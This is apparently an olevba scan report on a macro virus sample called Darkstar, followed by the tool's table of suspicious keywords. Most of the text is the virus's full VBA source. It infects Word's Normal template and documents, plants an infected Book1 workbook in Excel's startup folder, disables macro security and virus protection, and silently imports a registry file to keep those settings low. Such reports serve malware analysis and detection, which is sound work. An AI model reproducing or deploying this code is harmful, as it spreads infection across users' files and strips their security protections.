olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Darkstar-17cdac109ceee08e8b65102c8be30734a844b87c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Darkstar-17cdac109ceee08e8b65102c8be30734a844b87c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Document_Open()
'Darkstar
On Error Resume Next
Options.SaveNormalPrompt = False
Options.SendMailAttach = True
Options.ConfirmConversions = False
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Excel\Security", "Level") = 1
Else
CommandBars("Tools").Controls("Macro").Enabled = False
Options.VirusProtection = False
End If
Set Nrmal = NormalTemplate.VBProject.VBComponents(1).codemodule
Set aktiv = ActiveDocument.VBProject.VBComponents(1).codemodule
If Nrmal.Lines(2, 1) <> "'Darkstar" Then
Nrmal.DeleteLines 1, Nrmal.CountOfLines
Nrmal.InsertLines 2, aktiv.Lines(2, aktiv.CountOfLines)
Nrmal.InsertLines 1, "Sub Document_Open()"
Nrmal.Replaceline 42, "Sub Workbook_Deactivate"
End If
If aktiv.Lines(2, 1) <> "'Darkstar" Then
aktiv.DeleteLines 1, aktiv.CountOfLines
aktiv.InsertLines 2, Nrmal.Lines(2, Nrmal.CountOfLines)
aktiv.InsertLines 1, "Sub Document_Close()"
aktiv.Replaceline 42, "Sub Workbook_Activate()"
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End If
Set xlApp = CreateObject("Excel.Application")
If UCase(Dir(xlApp.Application.StartupPath + "\Book1.")) <> UCase("BOOK1") Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = ""
Set Book1Obj = xlApp.Workbooks.Add
Book1Obj.VBProject.VBComponents.Item("ThisWorkbook").codemodule.InsertLines 1, Nrmal.Lines(1, Nrmal.CountOfLines)
Book1Obj.VBProject.VBComponents.Item("ThisWorkbook").codemodule.Replaceline 42, "Sub Workbook_Deactivate()"
Book1Obj.SaveAs xlApp.Application.StartupPath & "\Book1."
Book1Obj.Close
xlApp.Quit
End If
End Sub
   
Sub Workbook_Deactivate()
On Error Resume Next
Set aw = ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").codemodule
Set tw = ThisWorkbook.VBProject.VBComponents("ThisWorkbook").codemodule
tw.Replaceline 42, "Sub Workbook_Deactivate"
If aw.Lines(2, 1) <> "'Darkstar" Then
aw.DeleteLines 1, aw.CountOfLines
aw.InsertLines 1, tw.Lines(1, tw.CountOfLines)
End If
If UCase(Dir(Application.StartupPath + "\Book1.")) <> "BOOK1" Then
ActiveWorkbook.SaveAs Excel.Application.StartupPath & "\Book1."
Open "c:\Dstar.reg" For Output As 1
Print #1, "REGEDIT4"
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel]"
Print #1, """Options6""=dword:00000000"
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Excel\Security]"
Print #1, """Level""=dword:00000001"
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security]"
Print #1, """Level""=dword:00000001"
Close 1
Shell "regedit /s c:\Dstar.reg", vbHide
Set WordObj = GetObject(, "Word.Application")
If WordObj = "" Then
Set WordObj = CreateObject("Word.Application")
crossQuit = True
End If
Set Nrmal = WordObj.NormalTemplate.VBProject.VBComponents(1).codemodule
WordObj.Options.SaveNormalPrompt = False
Nrmal.DeleteLines 1, Nrmal.CountOfLines
Nrmal.InsertLines 1, tw.Lines(1, tw.CountOfLines)
Nrmal.Replaceline 1, "Sub Document_Open"
Nrmal.Save
If crossQuit = True Then WordObj.Quit
End If
'And she will come from India with a gun at her side,
'Or she will come from Argentina
'with her cemetery eyes that say
'oh, how my Dark Star will rise
End Sub












+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |Workbook_Activate   |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Dstar.reg           |Executable file name                         |
+----------+--------------------+---------------------------------------------+

